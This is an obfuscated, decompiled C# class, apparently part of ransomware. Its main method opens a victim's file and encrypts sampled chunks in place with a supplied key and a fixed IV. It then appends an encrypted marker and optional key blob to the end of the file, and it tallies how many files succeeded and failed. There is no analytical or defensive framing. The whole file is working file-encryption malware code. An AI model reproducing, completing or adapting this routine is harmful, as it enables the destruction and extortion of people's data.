using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using fzdQQTJNGHZKSm;

namespace KNpKkassJHAdE;

internal sealed class RhunxOCwPGyFq
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int lEBTvRGpgWU(long long_0)
	{
		return (int)long_0;
	}

	public static bool cwGtynHLHHbFXx(string oHsywboDpkQTb, string CtslCZBrGRC, string SrzjWpbjkIkEONWt, byte[] cSDWDAEHunpcP = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(oHsywboDpkQTb, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = lEBTvRGpgWU(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(CtslCZBrGRC) * Convert.ToInt32(fileStream.Length) / 100;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = int.MaxValue;
				}
				if (num < num2)
				{
					num2 = num - Convert.ToInt32(CtslCZBrGRC) * 1000 * 1000;
				}
				int balmLPZcWzq = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 2; i++)
				{
					byte[] byte_ = zYkheNnoRCNtWeBI(oHsywboDpkQTb, fileStream, balmLPZcWzq, num * i);
					array = (GvesiNnPBqLNWZ.uXImrDqeGgUMuqj ? TWzuRmGwXZJuI.RWjIeFSWaBx(byte_, Encoding.ASCII.GetBytes(SrzjWpbjkIkEONWt), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : nCuLeFOJMwFm.lGkbxBLhmdAR(byte_, Encoding.ASCII.GetBytes(SrzjWpbjkIkEONWt), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					HohkmwglepWaJa(oHsywboDpkQTb, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (GvesiNnPBqLNWZ.mAogUeKgKjciiQM ? Encoding.ASCII.GetBytes(GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107459859)) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460811)) + Convert.ToString(CtslCZBrGRC) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460811))) : Encoding.ASCII.GetBytes(GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107459859)) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460852)) + Convert.ToString(CtslCZBrGRC) + GvesiNnPBqLNWZ.PezUDwzFibxi(getString_0(107460852))));
			if (!GvesiNnPBqLNWZ.mAogUeKgKjciiQM)
			{
				using FileStream fileStream2 = new FileStream(oHsywboDpkQTb, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(oHsywboDpkQTb, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(cSDWDAEHunpcP, 0, cSDWDAEHunpcP.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (GvesiNnPBqLNWZ.xhPAPGRrPiLSI)
			{
				try
				{
					File.AppendAllText(GvesiNnPBqLNWZ.YnUuGHOKmtC, getString_0(107349406) + oHsywboDpkQTb + getString_0(107459814) + ex.Message + getString_0(107397151));
				}
				catch (Exception)
				{
				}
			}
			GvesiNnPBqLNWZ.nejJdrwjWaKRmO++;
			return false;
		}
		GvesiNnPBqLNWZ.nYFqJsGRovRB++;
		return true;
	}

	public static byte[] zYkheNnoRCNtWeBI(string OYkBZIHohoyMe, FileStream dQEexYtNIevRpJp, int BalmLPZcWzq, int BDeKIxgfSlMuBc = 0)
	{
		byte[] array = new byte[BalmLPZcWzq];
		dQEexYtNIevRpJp.Position = BDeKIxgfSlMuBc;
		dQEexYtNIevRpJp.Read(array, 0, BalmLPZcWzq);
		return array;
	}

	public static void HohkmwglepWaJa(string VIwSAOMAoAdI, FileStream CnuwRomadokcjNnw, byte[] mPSlJOBbuRAzM, int IUEBuxFXyBMwJiGB = 0)
	{
		CnuwRomadokcjNnw.Position = IUEBuxFXyBMwJiGB;
		CnuwRomadokcjNnw.Write(mPSlJOBbuRAzM, 0, mPSlJOBbuRAzM.Length);
	}

	static RhunxOCwPGyFq()
	{
		Strings.CreateGetStringDelegate(typeof(RhunxOCwPGyFq));
	}
}
